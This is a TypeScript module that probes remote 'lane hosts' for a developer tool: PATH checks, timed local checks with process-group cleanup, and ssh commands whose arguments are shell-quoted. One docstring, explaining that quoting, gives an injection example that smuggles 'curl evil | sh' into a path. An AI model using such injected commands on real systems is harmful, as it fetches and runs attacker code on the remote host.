import { execFile, spawn } from "node:child_process";

/**
 * Whether a command is on PATH, without running it.
 *
 * `command` is a POSIX shell BUILTIN, and `execFile` runs no shell, so
 * `execFile("command", ...)` only works on a host that happens to ship a
 * `/usr/bin/command` shim (macOS does; Ubuntu does not). The probe therefore
 * goes through `/bin/sh`, which every POSIX host has at that path, and the
 * name travels as a positional parameter rather than being spliced into the
 * script, so a name is never interpreted as shell.
 *
 * `env` is a parameter so a test can hand it a PATH with no `command` shim in
 * it, which is what a Linux runner looks like.
 *
 * `options.cwd` is where a RELATIVE name (`./scripts/x`, which contains a `/`)
 * resolves, so a lane host's `dispatch[0]` means the same thing from any
 * subdirectory. A bare name is looked up on PATH and does not care.
 */
export function hasCommand(
  command: string,
  env: NodeJS.ProcessEnv = process.env,
  options: RunOptions = {},
): Promise<boolean> {
  return new Promise((resolve) => {
    try {
      execFile(
        "/bin/sh",
        ["-c", 'command -v "$1"', "sh", command],
        { env, ...(options.cwd !== undefined ? { cwd: options.cwd } : {}) },
        (error) => resolve(error === null),
      );
    } catch {
      // A NUL in `command` throws synchronously; it is not a command on PATH.
      resolve(false);
    }
  });
}

/**
 * What one probe of a lane host found (A-30 §1.1).
 *
 * Three outcomes, not two, because "the check did not finish" is not "the check
 * passed" and a doctor that reports those as the same answer reports a host that
 * has stopped answering as a host that is working.
 */
export type CheckStatus = "ok" | "failed" | "timeout";

/**
 * The ceiling on one `check` or one ssh probe.
 *
 * Ten seconds: long enough for a tunnel to open on demand, which is the dispatch
 * path's steady state rather than residue, and short enough that a wave start
 * does not sit on a host that will never answer.
 */
export const CHECK_TIMEOUT_MS = 10_000;

/**
 * Where a probe runs. `cwd` is the repository root for a bin: an overlay's
 * `check: [./scripts/x]` is written relative to the repository, and a doctor run
 * from a subdirectory would otherwise resolve it against that subdirectory.
 */
export interface RunOptions {
  readonly cwd?: string;
}

/** The options every probe here runs under. No shell, and its own process group. */
const SPAWN_BASE = {
  // No shell, always: argv is the transport prefix from the overlay, and a shell
  // would give a host declaration a second, invisible grammar.
  shell: false,
  // `detached` makes the child the leader of a NEW process group, so a negative
  // pid below reaches every descendant instead of only the process this module
  // happened to spawn. A check that opens a tunnel forks that tunnel; killing
  // the group is the difference between a bounded probe and a residue per run.
  detached: true,
} as const;

/**
 * Kill a probe's whole process group, and never throw for a group that is gone.
 *
 * The race is real: between the timer firing and this call the child can exit,
 * and `kill(-pid)` on a reaped group raises ESRCH. A group that is already gone
 * is the outcome the timeout wanted.
 */
function killGroup(pid: number | undefined): void {
  if (pid === undefined) return;
  try {
    process.kill(-pid, "SIGKILL");
  } catch {
    // Already gone.
  }
}

/**
 * The process groups of every probe still running.
 *
 * A probe is `detached`, so it is OUTSIDE the foreground group a terminal's
 * Ctrl-C signals: without this, interrupting doctor leaves every live probe
 * running until its own timer would have fired, and that timer died with doctor.
 */
const live = new Set<number>();
let handlersInstalled = false;

function killLive(): void {
  for (const pid of live) killGroup(pid);
}

/**
 * Install the cleanup handlers, once, on the first spawn (so importing this
 * module changes nothing about a process that never probes).
 *
 * `SIGINT` and `SIGTERM` kill every tracked group, then RE-RAISE the signal:
 * `process.once` removes the handler before it runs, so `process.kill(process.pid,
 * sig)` takes the default action and the exit status still says "killed by a
 * signal" rather than a swallowed interrupt. `exit` is the backstop for a normal
 * end with a probe somehow still tracked. Deliberately minimal: an `ssh -f` tunnel
 * is outside the group by design (see `runCheck`) and stays there.
 */
function installHandlers(): void {
  if (handlersInstalled) return;
  handlersInstalled = true;
  for (const signal of ["SIGINT", "SIGTERM"] as const) {
    process.once(signal, () => {
      killLive();
      process.kill(process.pid, signal);
    });
  }
  process.on("exit", killLive);
}

/**
 * Track a spawned child's group until `settle` says it is done.
 *
 * The handlers are NOT installed here: they must already be in place BEFORE
 * `spawn`. A probe can write its first byte (and so be observed, and the runner
 * interrupted) between `fork` and the statement after `spawn` returns, and a
 * runner descheduled in that window takes SIGINT with the default disposition:
 * it dies, the probe's group is never killed, and the probe is orphaned alive.
 */
function track(pid: number | undefined): void {
  if (pid !== undefined) live.add(pid);
}

/**
 * Run a lane host's `check`, and report whether the DISPATCH PATH works.
 *
 * Three things about this are load-bearing:
 *
 * - `detached: true`, so a timeout kills the whole group of anything that stayed
 *   in it. Note what that does NOT cover: OpenSSH `-f` goes through `daemon()`
 *   and `setsid`, so a tunnel it forks runs OUTSIDE this process group and
 *   outlives the kill. That is the tunnel doing what `-f` asks (a check that
 *   opens one is leaving it for the dispatch), not a leak in this runner.
 * - `stdio` is `ignore`, so a forked tunnel inherits no pipe of ours to hold open.
 *   That is also why this runner does NOT capture stderr, as `runRemote` does:
 *   a pipe here would be inherited by an `ssh -f` tunnel and, with the settle on
 *   `close`, hang the probe on a tunnel that is working as intended.
 * - it settles on the child's **`exit`**, not `close`. Were any descendant to
 *   inherit a pipe, `close` would wait for a writer that is never going to exit
 *   and report a working host as a timeout, forever.
 * - a spawn failure is `failed`, not a throw. `dispatch[0]` not being on PATH is
 *   `doctor`'s job to report, and this is the seam it reports it through.
 */
export function runCheck(
  argv: readonly string[],
  timeoutMs: number = CHECK_TIMEOUT_MS,
  options: RunOptions = {},
): Promise<CheckStatus> {
  const [command, ...args] = argv;
  if (command === undefined) return Promise.resolve("failed");
  return new Promise((resolve) => {
    let child: ReturnType<typeof spawn>;
    // Before `spawn`, never after: see `track`.
    installHandlers();
    try {
      child = spawn(command, args, {
        ...SPAWN_BASE,
        stdio: "ignore",
        ...(options.cwd !== undefined ? { cwd: options.cwd } : {}),
      });
    } catch {
      // `spawn` throws synchronously on a NUL in any word. That is `failed`, as
      // the docstring says, not an exception out of doctor.
      resolve("failed");
      return;
    }
    track(child.pid);
    let settled = false;
    const timer = setTimeout(() => {
      killGroup(child.pid);
      settle("timeout");
    }, timeoutMs);
    const settle = (status: CheckStatus): void => {
      if (settled) return;
      settled = true;
      clearTimeout(timer);
      if (child.pid !== undefined) live.delete(child.pid);
      resolve(status);
    };
    child.on("error", () => settle("failed"));
    child.on("exit", (code) => settle(code === 0 ? "ok" : "failed"));
  });
}

/**
 * One word, quoted for a POSIX shell: wrapped in single quotes, with each
 * embedded `'` written as `'\''` (close the quote, an escaped quote, reopen).
 * Inside single quotes nothing is special, so the result is exactly one literal
 * word whatever it holds: spaces, `;`, `$(…)`, backticks, newlines.
 */
export function shellQuote(word: string): string {
  return `'${word.replaceAll("'", "'\\''")}'`;
}

/** What one command on a remote host found, and what it printed. */
export interface RemoteResult {
  readonly status: CheckStatus;
  /** Trimmed stdout. The email read needs the value; nothing else does. */
  readonly stdout: string;
  /**
   * The LAST non-empty line ssh wrote to stderr, trimmed and capped at
   * `STDERR_LINE_MAX` characters; empty when it wrote none. It is what says WHY a
   * probe failed ("Permission denied (publickey)."), which an exit code cannot.
   */
  readonly stderr: string;
}

/** The cap on the surfaced stderr line. */
export const STDERR_LINE_MAX = 200;

/** The last non-empty line of `text`, trimmed and capped. */
function lastLine(text: string): string {
  const lines = text
    .split(/\r?\n/)
    .map((line) => line.trim())
    .filter((line) => line !== "");
  return (lines.at(-1) ?? "").slice(0, STDERR_LINE_MAX);
}

/**
 * Run a command on a remote host over ssh.
 *
 * `ssh -n` (no stdin, so a probe can never wait on a prompt), `BatchMode=yes`
 * (no password prompt, so a missing key is an answer rather than a hang) and
 * `ConnectTimeout=5` bound the CONNECTION. None of them bounds what happens
 * after it: DNS, and auth, both outlive `ConnectTimeout`, which is why the whole
 * thing is bounded again by `timeoutMs`.
 *
 * No LOCAL shell ever sees the argv (`shell: false`), but the REMOTE one does:
 * `ssh` joins its trailing arguments with spaces and hands the result to the
 * remote login shell, which parses it. A `clone` of `/srv/cf; curl evil | sh`
 * would therefore execute. Every remote word is POSIX single-quoted first, so
 * the far side receives exactly the words that were given here.
 */
export function runRemote(
  alias: string,
  argv: readonly string[],
  timeoutMs: number = CHECK_TIMEOUT_MS,
  options: RunOptions & {
    /** The ssh executable. A seam for tests, which stand a fake in for it. */
    readonly sshCommand?: string;
  } = {},
): Promise<RemoteResult> {
  return new Promise((resolve) => {
    let child: ReturnType<typeof spawn>;
    // Before `spawn`, never after: see `track`.
    installHandlers();
    try {
      child = spawn(
        options.sshCommand ?? "ssh",
        [
          "-n",
          "-o",
          "BatchMode=yes",
          "-o",
          "ConnectTimeout=5",
          alias,
          ...argv.map(shellQuote),
        ],
        {
          ...SPAWN_BASE,
          stdio: ["ignore", "pipe", "pipe"],
          ...(options.cwd !== undefined ? { cwd: options.cwd } : {}),
        },
      );
    } catch {
      // A NUL in any word throws synchronously; report it as a failed probe.
      resolve({ status: "failed", stdout: "", stderr: "" });
      return;
    }
    let settled = false;
    let stdout = "";
    child.stdout?.setEncoding("utf8");
    child.stdout?.on("data", (chunk: string) => {
      stdout += chunk;
    });
    // Only the tail is kept: the last line is all that is surfaced, and a noisy
    // host must not grow this without bound.
    let stderr = "";
    child.stderr?.setEncoding("utf8");
    child.stderr?.on("data", (chunk: string) => {
      stderr = (stderr + chunk).slice(-4_096);
    });
    track(child.pid);
    const timer = setTimeout(() => {
      killGroup(child.pid);
      settle("timeout");
    }, timeoutMs);
    const settle = (status: CheckStatus): void => {
      if (settled) return;
      settled = true;
      clearTimeout(timer);
      if (child.pid !== undefined) live.delete(child.pid);
      resolve({ status, stdout: stdout.trim(), stderr: lastLine(stderr) });
    };
    child.on("error", () => settle("failed"));
    // `close`, not `exit`: this runner READS stdout, and `exit` can fire before the
    // last of it has been delivered. Nothing here forks a tunnel that would hold the
    // pipe open (`-n`, no `-f`), and the timeout bounds it if something does.
    // The same `close` is what delivers the last of stderr.
    child.on("close", (code) => settle(code === 0 ? "ok" : "failed"));
  });
}
